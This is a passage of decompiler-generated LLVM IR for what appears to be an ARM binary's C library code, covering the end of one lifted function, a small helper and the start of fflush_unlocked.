  br i1 %v2_cef011, label %dec_label_pc_cefc, label %dec_label_pc_ceb4

dec_label_pc_ceb4:                                ; preds = %dec_label_pc_ce88, %dec_label_pc_ceec
  %v0_ced82 = phi i32 [ %v0_ceec, %dec_label_pc_ceec ], [ %v0_cef0.pr, %dec_label_pc_ce88 ]
  %v1_ceb4 = inttoptr i32 %v0_ced82 to i16*
  %v2_ceb4 = load i16, i16* %v1_ceb4, align 2
  %v3_ceb4 = zext i16 %v2_ceb4 to i32
  store i32 %v3_ceb4, i32* %r3.global-to-local, align 4
  %v2_ceb8 = and i32 %v3_ceb4, 32816
  store i32 %v2_ceb8, i32* %r1.global-to-local, align 4
  %v2_cebc = icmp ugt i32 %v2_ceb8, 47
  store i1 %v2_cebc, i1* %cpsr_c.global-to-local, align 1
  %v7_cebc = icmp eq i32 %v2_ceb8, 48
  %v1_cec0 = add i32 %v0_ced82, 32
  %v2_cec0 = inttoptr i32 %v1_cec0 to i32*
  %v3_cec0 = load i32, i32* %v2_cec0, align 4
  store i32 %v3_cec0, i32* %r4.global-to-local, align 4
  br i1 %v7_cebc, label %dec_label_pc_cecc, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_ceb4
  store i32 %v0_ced82, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ceec

dec_label_pc_cecc:                                ; preds = %dec_label_pc_ceb4
  %v0_cecc = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cecc = icmp eq i32 %v0_cecc, 0
  br i1 %v2_cecc, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_cecc
  %v1_ced0 = load i32, i32* %r5.global-to-local, align 4
  %v2_ced0 = load i32, i32* %r7.global-to-local, align 4
  %v3_ced0 = add i32 %v2_ced0, %v1_ced0
  %v4_ced0 = inttoptr i32 %v3_ced0 to i32*
  %v5_ced0 = load i32, i32* %v4_ced0, align 4
  store i32 %v5_ced0, i32* %r3.global-to-local, align 4
  %v3_ced4 = inttoptr i32 %v5_ced0 to i32*
  store i32 %v3_cec0, i32* %v3_ced4, align 4
  %v0_ced8 = load i32, i32* %r2.global-to-local, align 4
  %v1_ced8 = inttoptr i32 %v0_ced8 to i16*
  %v2_ced8 = load i16, i16* %v1_ced8, align 2
  %v3_ced8 = zext i16 %v2_ced8 to i32
  store i32 %v3_ced8, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_cecc
  %v2_ced88 = load i16, i16* %v1_ceb4, align 2
  %v3_ced89 = zext i16 %v2_ced88 to i32
  store i32 %v3_ced89, i32* %r3.global-to-local, align 4
  %v3_cedc = add i32 %v0_cecc, 32
  %v4_cedc = inttoptr i32 %v3_cedc to i32*
  store i32 %v3_cec0, i32* %v4_cedc, align 4
  %v0_cee0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_cee0 = phi i32 [ %v3_ced8, %.thread ], [ %v0_cee0.pre, %bb49 ]
  %v1_cee0 = and i32 %v0_cee0, 8192
  %v2_cee0 = icmp eq i32 %v1_cee0, 0
  br i1 %v2_cee0, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_cee4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cee4, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_cee8 = xor i1 %v2_cee0, true
  call void @__pseudo_cond_branch(i1 %v1_cee8, i32 ptrtoint (i32* @global_var_f0a8.425 to i32))
  %v0_ceec.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ceec

dec_label_pc_ceec:                                ; preds = %.thread38, %bb52
  %v0_ceec = phi i32 [ %v0_ceec.pre, %bb52 ], [ %v3_cec0, %.thread38 ]
  store i32 %v0_ceec, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cef0 = icmp eq i32 %v0_ceec, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_cef0, label %dec_label_pc_cefc, label %dec_label_pc_ceb4

dec_label_pc_cefc:                                ; preds = %dec_label_pc_ceec, %dec_label_pc_ce88
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_cf00 = load i32, i32* %r5.global-to-local, align 4
  %v2_cf00 = add i32 %v0_cf00, 160
  %v3_cf00 = inttoptr i32 %v2_cf00 to i32*
  %v4_cf00 = load i32, i32* %v3_cf00, align 4
  store i32 %v4_cf00, i32* %r0.global-to-local, align 4
  %v1_cf04 = add i32 %v4_cf00, 4
  %v2_cf04 = inttoptr i32 %v1_cf04 to i32*
  %v3_cf04 = load i32, i32* %v2_cf04, align 4
  %v1_cf08 = add i32 %v3_cf04, -1
  store i32 %v1_cf08, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cf0c = icmp eq i32 %v1_cf08, 0
  store i32 %v1_cf08, i32* %v2_cf04, align 4
  br i1 %v2_cf0c, label %dec_label_pc_cf18, label %dec_label_pc_cf78

dec_label_pc_cf18:                                ; preds = %dec_label_pc_cefc
  %v0_cf18 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf18 = load i32, i32* %r0.global-to-local, align 4
  %v2_cf18 = add i32 %v1_cf18, 8
  %v3_cf18 = inttoptr i32 %v2_cf18 to i32*
  store i32 %v0_cf18, i32* %v3_cf18, align 4
  %v0_cf1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_cf1c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cf20

dec_label_pc_cf20:                                ; preds = %dec_label_pc_cf50.dec_label_pc_cf20_crit_edge, %dec_label_pc_cf18
  %v0_cf20 = phi i32 [ %v0_cf20.pre, %dec_label_pc_cf50.dec_label_pc_cf20_crit_edge ], [ %v0_cf1c, %dec_label_pc_cf18 ]
  %v1_cf20 = inttoptr i32 %v0_cf20 to i32*
  %v2_cf20 = load i32, i32* %v1_cf20, align 4
  store i32 %v2_cf20, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_cf20, i32* %r2.global-to-local, align 4
  %v2_cf2c74 = load i32, i32* %v1_cf20, align 4
  store i32 %v2_cf2c74, i32* %r3.global-to-local, align 4
  %v3_cf3076 = icmp uge i32 %v2_cf2c74, %v2_cf20
  store i1 %v3_cf3076, i1* %cpsr_c.global-to-local, align 1
  %v9_cf3082 = icmp eq i32 %v2_cf2c74, %v2_cf20
  br i1 %v9_cf3082, label %dec_label_pc_cf38, label %dec_label_pc_cf50

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf20, %dec_label_pc_cf38.dec_label_pc_cf2c_crit_edge
  %v0_cf3883 = phi i32 [ %v1_cf30.pre, %dec_label_pc_cf38.dec_label_pc_cf2c_crit_edge ], [ %v2_cf20, %dec_label_pc_cf20 ]
  store i32 %v0_cf3883, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cf48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cf48, label %dec_label_pc_cf4c, label %dec_label_pc_cf38.dec_label_pc_cf2c_crit_edge

dec_label_pc_cf38.dec_label_pc_cf2c_crit_edge:    ; preds = %dec_label_pc_cf38
  %v0_cf2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cf30.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_cf2c = inttoptr i32 %v0_cf2c.pre to i32*
  %v2_cf2c = load i32, i32* %v1_cf2c, align 4
  store i32 %v2_cf2c, i32* %r3.global-to-local, align 4
  %v3_cf30 = icmp uge i32 %v2_cf2c, %v1_cf30.pre
  store i1 %v3_cf30, i1* %cpsr_c.global-to-local, align 1
  %v9_cf30 = icmp eq i32 %v2_cf2c, %v1_cf30.pre
  br i1 %v9_cf30, label %dec_label_pc_cf38, label %dec_label_pc_cf50

dec_label_pc_cf4c:                                ; preds = %dec_label_pc_cf38
  %v0_cf4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_cf4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cf50

dec_label_pc_cf50:                                ; preds = %dec_label_pc_cf20, %dec_label_pc_cf38.dec_label_pc_cf2c_crit_edge, %dec_label_pc_cf4c
  %v0_cf58 = phi i32 [ %v0_cf4c, %dec_label_pc_cf4c ], [ %v2_cf2c74, %dec_label_pc_cf20 ], [ %v2_cf2c, %dec_label_pc_cf38.dec_label_pc_cf2c_crit_edge ]
  %v1_cf50 = phi i32 [ %v0_cf4c, %dec_label_pc_cf4c ], [ %v2_cf20, %dec_label_pc_cf20 ], [ %v1_cf30.pre, %dec_label_pc_cf38.dec_label_pc_cf2c_crit_edge ]
  %v3_cf50 = icmp uge i32 %v0_cf58, %v1_cf50
  store i1 %v3_cf50, i1* %cpsr_c.global-to-local, align 1
  %v9_cf50 = icmp eq i32 %v0_cf58, %v1_cf50
  br i1 %v9_cf50, label %dec_label_pc_cf58, label %dec_label_pc_cf50.dec_label_pc_cf20_crit_edge

dec_label_pc_cf50.dec_label_pc_cf20_crit_edge:    ; preds = %dec_label_pc_cf50
  %v0_cf20.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cf20

dec_label_pc_cf58:                                ; preds = %dec_label_pc_cf50
  %v2_cf58 = icmp ne i32 %v1_cf50, 0
  store i1 %v2_cf58, i1* %cpsr_c.global-to-local, align 1
  %v7_cf5c = icmp slt i32 %v1_cf50, 2
  br i1 %v7_cf5c, label %dec_label_pc_cf78, label %dec_label_pc_cf60

dec_label_pc_cf60:                                ; preds = %dec_label_pc_cf58
  %v0_cf60 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_cf60, i32* %r0.global-to-local, align 4
  %v0_cf64 = load i32, i32* %r1.global-to-local, align 4
  %v1_cf64 = add i32 %v0_cf64, 129
  store i32 %v1_cf64, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cf78

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cefc, %dec_label_pc_cf60, %dec_label_pc_cf58
  store i32 88, i32* %r3.global-to-local, align 4
  %v0_cf7c = load i32, i32* %r5.global-to-local, align 4
  %v2_cf7c = add i32 %v0_cf7c, 88
  %v3_cf7c = inttoptr i32 %v2_cf7c to i32*
  %v4_cf7c = load i32, i32* %v3_cf7c, align 4
  store i32 %v4_cf7c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_cf84 = inttoptr i32 %v4_cf7c to i32*
  store i32 0, i32* %v2_cf84, align 4
  br label %dec_label_pc_cf88

dec_label_pc_cf88:                                ; preds = %dec_label_pc_cdfc, %dec_label_pc_ce24, %dec_label_pc_cf78
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_cf8c = load i32, i32* %r5.global-to-local, align 4
  %v2_cf8c = add i32 %v0_cf8c, 168
  %v3_cf8c = inttoptr i32 %v2_cf8c to i32*
  %v4_cf8c = load i32, i32* %v3_cf8c, align 4
  store i32 %v4_cf8c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_cf94 = add i32 %v0_cf8c, 12
  %v3_cf94 = inttoptr i32 %v2_cf94 to i32*
  %v4_cf94 = load i32, i32* %v3_cf94, align 4
  store i32 %v4_cf94, i32* @r1, align 4
  %v1_cf98 = add i32 %v4_cf8c, 4
  %v2_cf98 = inttoptr i32 %v1_cf98 to i32*
  %v3_cf98 = load i32, i32* %v2_cf98, align 4
  store i32 %v3_cf98, i32* %r2.global-to-local, align 4
  %v1_cf9c = inttoptr i32 %v4_cf94 to i32*
  %v2_cf9c = load i32, i32* %v1_cf9c, align 4
  %v1_cfa0 = add i32 %v3_cf98, -1
  store i32 %v1_cfa0, i32* %r2.global-to-local, align 4
  %v1_cfa4 = add i32 %v2_cf9c, -1
  store i32 %v1_cfa4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cfa8 = icmp eq i32 %v1_cfa0, 0
  store i32 %v1_cfa4, i32* %v1_cf9c, align 4
  %v0_cfb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_cfb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_cfb0 = add i32 %v1_cfb0, 4
  %v3_cfb0 = inttoptr i32 %v2_cfb0 to i32*
  store i32 %v0_cfb0, i32* %v3_cfb0, align 4
  br i1 %v2_cfa8, label %dec_label_pc_cfb8, label %dec_label_pc_d018

dec_label_pc_cfb8:                                ; preds = %dec_label_pc_cf88
  %v0_cfb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_cfb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_cfb8 = add i32 %v1_cfb8, 8
  %v3_cfb8 = inttoptr i32 %v2_cfb8 to i32*
  store i32 %v0_cfb8, i32* %v3_cfb8, align 4
  %v0_cfbc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_cfbc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cfc0

dec_label_pc_cfc0:                                ; preds = %dec_label_pc_cff0.dec_label_pc_cfc0_crit_edge, %dec_label_pc_cfb8
  %v0_cfc0 = phi i32 [ %v0_cfc0.pre, %dec_label_pc_cff0.dec_label_pc_cfc0_crit_edge ], [ %v0_cfbc, %dec_label_pc_cfb8 ]
  %v1_cfc0 = inttoptr i32 %v0_cfc0 to i32*
  %v2_cfc0 = load i32, i32* %v1_cfc0, align 4
  store i32 %v2_cfc0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_cfc0, i32* %r2.global-to-local, align 4
  %v2_cfcc62 = load i32, i32* %v1_cfc0, align 4
  store i32 %v2_cfcc62, i32* %r3.global-to-local, align 4
  %v3_cfd064 = icmp uge i32 %v2_cfcc62, %v2_cfc0
  store i1 %v3_cfd064, i1* %cpsr_c.global-to-local, align 1
  %v9_cfd070 = icmp eq i32 %v2_cfcc62, %v2_cfc0
  br i1 %v9_cfd070, label %dec_label_pc_cfd8, label %dec_label_pc_cff0

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cfc0, %dec_label_pc_cfd8.dec_label_pc_cfcc_crit_edge
  %v0_cfd871 = phi i32 [ %v1_cfd0.pre, %dec_label_pc_cfd8.dec_label_pc_cfcc_crit_edge ], [ %v2_cfc0, %dec_label_pc_cfc0 ]
  store i32 %v0_cfd871, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cfe8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cfe8, label %dec_label_pc_cfec, label %dec_label_pc_cfd8.dec_label_pc_cfcc_crit_edge

dec_label_pc_cfd8.dec_label_pc_cfcc_crit_edge:    ; preds = %dec_label_pc_cfd8
  %v0_cfcc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cfd0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_cfcc = inttoptr i32 %v0_cfcc.pre to i32*
  %v2_cfcc = load i32, i32* %v1_cfcc, align 4
  store i32 %v2_cfcc, i32* %r3.global-to-local, align 4
  %v3_cfd0 = icmp uge i32 %v2_cfcc, %v1_cfd0.pre
  store i1 %v3_cfd0, i1* %cpsr_c.global-to-local, align 1
  %v9_cfd0 = icmp eq i32 %v2_cfcc, %v1_cfd0.pre
  br i1 %v9_cfd0, label %dec_label_pc_cfd8, label %dec_label_pc_cff0

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfd8
  %v0_cfec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_cfec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cff0

dec_label_pc_cff0:                                ; preds = %dec_label_pc_cfc0, %dec_label_pc_cfd8.dec_label_pc_cfcc_crit_edge, %dec_label_pc_cfec
  %v0_cff8 = phi i32 [ %v0_cfec, %dec_label_pc_cfec ], [ %v2_cfcc62, %dec_label_pc_cfc0 ], [ %v2_cfcc, %dec_label_pc_cfd8.dec_label_pc_cfcc_crit_edge ]
  %v1_cff0 = phi i32 [ %v0_cfec, %dec_label_pc_cfec ], [ %v2_cfc0, %dec_label_pc_cfc0 ], [ %v1_cfd0.pre, %dec_label_pc_cfd8.dec_label_pc_cfcc_crit_edge ]
  %v3_cff0 = icmp uge i32 %v0_cff8, %v1_cff0
  store i1 %v3_cff0, i1* %cpsr_c.global-to-local, align 1
  %v9_cff0 = icmp eq i32 %v0_cff8, %v1_cff0
  br i1 %v9_cff0, label %dec_label_pc_cff8, label %dec_label_pc_cff0.dec_label_pc_cfc0_crit_edge

dec_label_pc_cff0.dec_label_pc_cfc0_crit_edge:    ; preds = %dec_label_pc_cff0
  %v0_cfc0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cfc0

dec_label_pc_cff8:                                ; preds = %dec_label_pc_cff0
  %v2_cff8 = icmp ne i32 %v1_cff0, 0
  store i1 %v2_cff8, i1* %cpsr_c.global-to-local, align 1
  %v7_cffc = icmp slt i32 %v1_cff0, 2
  br i1 %v7_cffc, label %dec_label_pc_d018, label %dec_label_pc_d000

dec_label_pc_d000:                                ; preds = %dec_label_pc_cff8
  %v0_d000 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_d000, i32* %r0.global-to-local, align 4
  %v0_d004 = load i32, i32* @r1, align 4
  %v1_d004 = add i32 %v0_d004, 129
  store i32 %v1_d004, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d018

dec_label_pc_d018:                                ; preds = %dec_label_pc_cf88, %dec_label_pc_d000, %dec_label_pc_cff8
  %v2_d01c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d01c, i32* %r4.global-to-local, align 4
  %v1_d020 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_d020

; uselistorder directives
  uselistorder i32 %v0_cfec, { 1, 0, 2 }
  uselistorder i32 %v1_cfd0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_cfc0, { 1, 0 }
  uselistorder i32 %v0_cf4c, { 1, 0, 2 }
  uselistorder i32 %v1_cf30.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_cf20, { 1, 0 }
  uselistorder i32 %v0_ceec, { 2, 1, 0 }
  uselistorder i32 %v0_ce90, { 1, 0 }
  uselistorder i32 %v0_ce74, { 1, 0, 2 }
  uselistorder i32 %v1_ce58.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_ce44, { 1, 0 }
  uselistorder i32 %v0_cde8, { 1, 0, 2 }
  uselistorder i32 %v1_cdcc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_cda0, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 44, 8, 9, 10, 11, 12, 13, 14, 16, 15, 43, 17, 18, 19, 0, 1, 20, 21, 22, 23, 24, 25, 26, 28, 27, 2, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 3, 41, 42 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 8, 7, 1, 9, 10, 11, 13, 12, 0, 14, 17, 15, 16, 2, 18, 20, 19, 3, 21, 22, 23, 24, 26, 25, 4, 27 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d018, { 1, 2, 0 }
  uselistorder label %dec_label_pc_cff0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cfd8, { 1, 0 }
  uselistorder label %dec_label_pc_cf88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_cf50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf38, { 1, 0 }
  uselistorder label %dec_label_pc_ceec, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_ceb4, { 1, 0 }
  uselistorder label %dec_label_pc_ce88, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_ce78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ce60, { 1, 0 }
  uselistorder label %dec_label_pc_cdfc, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_cdec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cdd4, { 1, 0 }
}

define i32 @function_d028(i32 %arg1) local_unnamed_addr {
dec_label_pc_d028:
  %v0_d028 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d028, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_d028
  %v2_d028 = load i32, i32* @r8, align 4
  %v5_d028 = udiv i32 %v2_d028, 2
  %v6_d028 = and i32 %v5_d028, %arg1
  %v2_d02c = load i32, i32* @ip, align 4
  %v3_d02c = and i32 %v6_d028, %v2_d02c
  %v8_d030 = ashr i32 %v2_d028, %v3_d02c
  %v9_d030 = and i32 %v8_d030, %v3_d02c
  %v5_d034 = udiv i32 %v9_d030, 2
  %v6_d034 = and i32 %v5_d034, %v9_d030
  %v2_d038 = load i32, i32* @r4, align 4
  %v8_d038 = ashr i32 %v2_d038, %v6_d034
  %v9_d038 = and i32 %v8_d038, %v6_d034
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_d028, %bb
  %v10_d03c = phi i32 [ %arg1, %dec_label_pc_d028 ], [ %v9_d038, %bb ]
  ret i32 %v10_d03c

; uselistorder directives
  uselistorder i32 %v9_d030, { 1, 0 }
  uselistorder i32 %v2_d028, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v6_d040 = load i32, i32* @r5, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r6, align 4
  %v4_d050 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 84) to i32*), align 4
  store i32 %v4_d050, i32* %r3.global-to-local, align 4
  %v4_d054 = icmp uge i32 %tmp, %v4_d050
  store i1 %v4_d054, i1* %cpsr_c.global-to-local, align 1
  %v10_d054 = icmp eq i32 %tmp, %v4_d050
  br i1 %v10_d054, label %bb, label %dec_label_pc_d06c

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_d07c

dec_label_pc_d06c:                                ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_d070 = icmp eq i16* %arg1, null
  br i1 %v3_d070, label %dec_label_pc_d07c, label %dec_label_pc_d390

dec_label_pc_d07c:                                ; preds = %bb, %dec_label_pc_d06c
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_d06c ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v4_d080 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 168) to i32*), align 4
  store i32 %v4_d080, i32* %r5.global-to-local, align 4
  %v0_d084 = call i32 @__aeabi_read_tp()
  store i32 %v0_d084, i32* %r0.global-to-local, align 4
  %v1_d088 = add i32 %v4_d080, 8
  %v2_d088 = inttoptr i32 %v1_d088 to i32*
  %v3_d088 = load i32, i32* %v2_d088, align 4
  store i32 %v3_d088, i32* %r3.global-to-local, align 4
  %v1_d08c = add i32 %v0_d084, -1168
  store i32 %v1_d08c, i32* %r8.global-to-local, align 4
  %v3_d090 = icmp uge i32 %v3_d088, %v1_d08c
  store i1 %v3_d090, i1* %cpsr_c.global-to-local, align 1
  %v9_d090 = icmp eq i32 %v3_d088, %v1_d08c
  br i1 %v9_d090, label %dec_label_pc_d0d8, label %dec_label_pc_d098

dec_label_pc_d098:                                ; preds = %dec_label_pc_d07c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_d080, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_d0a4143 = inttoptr i32 %v4_d080 to i32*
  %v2_d0a4144 = load i32, i32* %v1_d0a4143, align 4
  store i32 %v2_d0a4144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d0a8146 = icmp eq i32 %v2_d0a4144, 0
  br i1 %v9_d0a8146, label %dec_label_pc_d0b0, label %dec_label_pc_d0c8

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d098, %dec_label_pc_d0b0.dec_label_pc_d0a4_crit_edge
  %v0_d0b0147 = phi i32 [ %v1_d0a8.pre, %dec_label_pc_d0b0.dec_label_pc_d0a4_crit_edge ], [ 0, %dec_label_pc_d098 ]
  store i32 %v0_d0b0147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d0c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d0c0, label %dec_label_pc_d0c4, label %dec_label_pc_d0b0.dec_label_pc_d0a4_crit_edge

dec_label_pc_d0b0.dec_label_pc_d0a4_crit_edge:    ; preds = %dec_label_pc_d0b0
  %v0_d0a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d0a8.pre = load i32, i32* @r4, align 4
  %v1_d0a4 = inttoptr i32 %v0_d0a4.pre to i32*
  %v2_d0a4 = load i32, i32* %v1_d0a4, align 4
  store i32 %v2_d0a4, i32* %r3.global-to-local, align 4
  %v3_d0a8 = icmp uge i32 %v2_d0a4, %v1_d0a8.pre
  store i1 %v3_d0a8, i1* %cpsr_c.global-to-local, align 1
  %v9_d0a8 = icmp eq i32 %v2_d0a4, %v1_d0a8.pre
  br i1 %v9_d0a8, label %dec_label_pc_d0b0, label %dec_label_pc_d0c8

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d0b0
  %v0_d0c4 = load i32, i32* @r4, align 4
  store i32 %v0_d0c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d0c8

dec_label_pc_d0c8:                                ; preds = %dec_label_pc_d098, %dec_label_pc_d0b0.dec_label_pc_d0a4_crit_edge, %dec_label_pc_d0c4
  %v0_d0c8 = phi i32 [ %v0_d0c4, %dec_label_pc_d0c4 ], [ %v2_d0a4144, %dec_label_pc_d098 ], [ %v2_d0a4, %dec_label_pc_d0b0.dec_label_pc_d0a4_crit_edge ]
  %v1_d0c8 = phi i32 [ %v0_d0c4, %dec_label_pc_d0c4 ], [ 0, %dec_label_pc_d098 ], [ %v1_d0a8.pre, %dec_label_pc_d0b0.dec_label_pc_d0a4_crit_edge ]
  %v3_d0c8 = icmp uge i32 %v0_d0c8, %v1_d0c8
  store i1 %v3_d0c8, i1* %cpsr_c.global-to-local, align 1
  %v9_d0c8 = icmp eq i32 %v0_d0c8, %v1_d0c8
  br i1 %v9_d0c8, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_d0c8
  %v1_d0cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_d0cc, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_d0c8, %bb65
  %v1_d0d0 = xor i1 %v9_d0c8, true
  call void @__pseudo_cond_branch(i1 %v1_d0d0, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_d0d4 = load i32, i32* %r8.global-to-local, align 4
  %v1_d0d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_d0d4 = add i32 %v1_d0d4, 8
  %v3_d0d4 = inttoptr i32 %v2_d0d4 to i32*
  store i32 %v0_d0d4, i32* %v3_d0d4, align 4
  br label %dec_label_pc_d0d8

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d07c, %bb66
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_d0dc = load i32, i32* @r6, align 4
  %v2_d0dc = add i32 %v0_d0dc, 168
  %v3_d0dc = inttoptr i32 %v2_d0dc to i32*
